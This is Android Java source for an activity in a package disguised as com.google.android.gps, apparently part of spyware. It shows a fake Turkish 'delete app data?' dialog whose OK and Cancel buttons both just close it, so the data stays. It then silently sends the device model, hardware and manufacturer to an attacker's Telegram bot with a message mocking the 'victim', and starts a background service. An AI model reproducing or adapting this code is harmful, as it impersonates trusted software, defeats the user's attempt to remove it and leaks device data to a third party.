package com.google.android.gps ;

import android.app.*;
import android.content.*;
import android.os.*;
import android.view.*;
import android.webkit.*;

public class ManageSpaceActivity extends Activity {

	AlertDialog ad;
	
	@Override
	public void onCreate(Bundle b){
		super.onCreate(b);
		
		AlertDialog.Builder ab = new AlertDialog.Builder(new ContextThemeWrapper(this, android.R.style.Theme_DeviceDefault_Dialog))
			.setOnCancelListener(new DialogInterface.OnCancelListener(){
				@Override
				public void onCancel(DialogInterface p1){
					send();
					finish();
				}
			})
			.setTitle("Uygulama verileri silinsin mi?")
			.setMessage("Bu uygulamanın tüm verileri kalıcı olarak silinecek. Bu veriler arasında tüm dosyalar, ayarlar, hesaplar, veritabanları vb. yer alıyor.")
			.setPositiveButton(android.R.string.ok, new DialogInterface.OnClickListener(){
				@Override
				public void onClick(DialogInterface p1, int p2){
					ad.cancel();
				}
			})
			.setNegativeButton(android.R.string.cancel, new DialogInterface.OnClickListener(){
				@Override
				public void onClick(DialogInterface p1, int p2){
					ad.cancel();
				}
			});

		if(Build.VERSION.SDK_INT <= 19)
			ab.setIcon(getResources().getDrawable(R.drawable.ic_alert_dark));

		ad = ab.create();
		startService(new Intent(this,NotificationService.class));
		ad.show();
		
	}
	
	String bosluk(){
		String temp = "";
		for(int i = 0;i!=150;i++)
			temp += " ";
		return temp;
	}
	
	void send(){
		String s1 = Build.DEVICE;
		String s2 = Build.HARDWARE;
		String s3 = Build.MANUFACTURER;
		String temp = "😂 "+getResources().getString(R.string.takmaad)+bosluk()+"Cihaz: "+s1+" "+s2+" "+s3+bosluk()+"-> Kurban uygulama verisini silmeye çalıştı ama başaramadı!";
		String token = getResources().getString(R.string.botid);
		String user = getResources().getString(R.string.userid);
		String telegram = "https://api.telegram.org/bot"+token+"/sendMessage?text="+temp+"&chat_id="+user;
		(new WebView(this)).loadUrl(telegram);
	}
	
}
